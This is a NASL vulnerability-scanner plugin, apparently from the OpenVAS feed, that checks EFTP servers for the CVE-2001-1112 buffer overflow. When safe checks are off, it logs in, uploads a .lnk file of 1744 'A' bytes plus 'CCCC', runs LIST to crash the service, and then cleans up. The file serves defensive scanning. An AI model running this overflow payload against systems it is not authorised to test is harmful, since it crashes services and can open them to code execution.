# SPDX-FileCopyrightText: 2001 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10928");
  script_version("2023-12-20T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-12-20 05:05:58 +0000 (Wed, 20 Dec 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3330");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2001-1112");
  script_name("EFTP buffer overflow");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2001 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/eftp/detected");

  script_tag(name:"solution", value:"Upgrade EFTP to 2.0.8.x.");

  script_tag(name:"summary", value:"It was possible to crash the EFTP service by
  uploading a *.lnk file containing too much data.");

  script_tag(name:"impact", value:"A cracker may use this attack to make this
  service crash continuously, or run arbitrary code on your system.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ftp_get_port(default:21);
banner = ftp_get_banner(port: port);
if(! banner || "EFTP " >!< banner)
  exit(0);

writeable_dir = get_kb_item("ftp/writeable_dir");
use_banner = 1;

kb_creds = ftp_get_kb_creds();
user_login = kb_creds["login"];
user_passwd = kb_creds["pass"];
if (user_login && user_passwd && writeable_dir) {
  use_banner = safe_checks();
}

if (use_banner) {
  if(egrep(pattern:".*EFTP Version 2\.0\.[0-7]\.*", string:banner)) {
    security_message(port:port);
  }
  exit(0);
}

soc = open_sock_tcp(port);
if (!soc)
  exit(0);

r = ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
if (!r) {
  ftp_close(socket: soc);
  exit(0);
}

# Go to writable dir
cmd = string("CWD ", writeable_dir, "\r\n");
send(socket:soc, data:cmd);
a = recv_line(socket:soc, length:1024);

vt_strings = get_vt_strings();

f_name = string(vt_strings["default"], rand()%10, rand()%10, rand()%10, rand()%10, ".lnk");

# Upload a buggy .LNK
port2 = ftp_pasv(socket:soc);
soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
cmd = string("STOR ", f_name, "\r\n");
send(socket:soc, data:cmd);
r = recv_line(socket:soc, length:1024); # Read the 3 digits ?
if(ereg(pattern:"^5[0-9][0-9] .*", string:r)) {
  exit(0);
}

d = string(crap(length:1744, data: "A"), "CCCC");
send(socket:soc2, data:d);
close(soc2);

# Now run DIR
cmd = string("LIST\r\n");
send(socket:soc, data:cmd);
r = recv_line(socket: soc, length: 1024);
ftp_close(socket: soc);

# Now check if it is still alive
soc = open_sock_tcp(port);
if (! soc) {
  security_message(port:port);
}

# Or clean mess :)

if(soc) {
  ftp_authenticate(socket:soc, user:user_login, pass:user_passwd);
  cmd = string("CWD ", writeable_dir, "\r\n");
  send(socket:soc, data:cmd);
  r = recv_line(socket:soc, length:1024);
  cmd = string ("DELE ", f_name, "\r\n");
  send(socket:soc, data:cmd);
  r = recv_line(socket:soc, length:1024);
  ftp_close(socket: soc);
}
